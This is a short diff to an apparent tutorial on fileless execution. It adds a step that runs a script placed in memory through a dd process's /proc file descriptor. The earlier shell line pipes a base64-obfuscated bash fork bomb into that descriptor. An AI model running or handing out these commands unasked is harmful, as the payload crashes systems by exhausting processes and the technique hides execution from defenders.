@@ -173,3 +173,8 @@ then, transfer it to the in-memory-only file,
 ```shell
 echo "IyEvYmluL2Jhc2gKOigpeyA6fDomIH07Ogo=" | base64 -d > /proc/`pidof dd`/fd/3
 ```
+
+and finally, run the in-memory-only file,
+```shell
+/proc/`pidof dd`/fd/3 -a
+```
